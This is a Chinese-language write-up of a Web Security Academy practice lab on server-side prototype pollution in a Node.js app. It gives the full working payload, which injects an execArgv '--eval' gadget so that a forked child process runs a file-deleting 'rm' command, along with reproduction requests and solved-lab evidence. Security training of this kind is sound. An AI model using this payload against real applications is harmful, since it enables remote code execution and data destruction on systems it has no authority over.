---
title: "lab-remote-code-execution-via-server-side-prototype-pollution"
links:
  - target: prototype-pollution-family
    relation: evidences
---

# lab-remote-code-execution-via-server-side-prototype-pollution

> evidences: [[prototype-pollution-family]]

- 题面:Remote code execution via server-side prototype pollution
  (/web-security/prototype-pollution/server-side/lab-remote-code-execution-via-server-side-prototype-pollution)
- 实例:https://0a7a00300378d706870c4974000e0080.web-security-academy.net(`wiener:peter`)
- 判定目标:用 PP 注入系统命令删除 `/home/carlos/morale.txt`;状态:**solved**

## 机制:触发面 → 源 → gadget

**触发面 `POST /admin/jobs`**:`/admin` 的 jobs 表单带 `csrf` + `sessionId` + 两个 `tasks` 隐藏字段,
`runAdminJobs.js` 以 **JSON** 提交 `{"csrf":..,"sessionId":..,"tasks":["db-cleanup","fs-cleanup"]}`;
**空体会 500**(缺 csrf/tasks)——不要把 500 读成“端点坏”。补全 JSON 体后返回 200 并回
`{"results":[{"name":"db-cleanup","success":true,"message":"Child process executed successfully"},{...}]}`
——"Child process executed successfully"即子进程确实被拉起,gadget 面成立。

**源**:`POST /my-account/change-address`(JSON,含 `sessionId`)+ `"__proto__":{...}` → 污染全局
`Object.prototype`(判据:`"json spaces":5` 后所有 JSON 响应按 5 空格缩进 ✓)。

**gadget:`execArgv`(fork 专用)**

```
POST /my-account/change-address
{"address_line_1":"a",...,"sessionId":"<sid>",
 "__proto__":{"execArgv":["--eval=require('child_process').execSync('rm /home/carlos/morale.txt')"]}}
```
维护 job 用 `child_process.fork()` 起子进程;污染后的 `execArgv` 被 fork 读走,`--eval=<js>` 被注入
子进程 node 命令行 → 直接执行 js(RCE),替代原 job 脚本(故 `fs-cleanup` 报 code 1、`db-cleanup` 仍 success)。

## 复现命令

```
lab_http post "<inst>/login" --header 'Content-Type: application/json' \
  --body '{"csrf":"<csrf>","username":"wiener","password":"peter"}'
lab_http post "<inst>/my-account/change-address" --header 'Content-Type: application/json' \
  --body '{"address_line_1":"a","address_line_2":"b","city":"c","postcode":"d","country":"e","sessionId":"<sid>","__proto__":{"execArgv":["--eval=require('\''child_process'\'').execSync('\''rm /home/carlos/morale.txt'\'')"]}}'
lab_http get  "<inst>/admin" --jar <jar>       # 取 csrf
lab_http post "<inst>/admin/jobs" --header 'Content-Type: application/json' \
  --body '{"csrf":"<csrf>","sessionId":"<sid>","tasks":["db-cleanup","fs-cleanup"]}'
```

## 证据摘录

```
change-address 响应(污染生效):{\n     "username": "wiener", ... "json spaces": 5, "execArgv": [...]}   # 5 空格缩进
POST /admin/jobs(JSON 体)-> 200 {"results":[{"name":"db-cleanup","success":true,"message":"Child process executed successfully"},{"name":"fs-cleanup","success":false,"error":{"code":1,...}}]}
solved_check -> {"congrats_line":"<h4>Congratulations, you solved the lab!</h4>","solved":true}
```
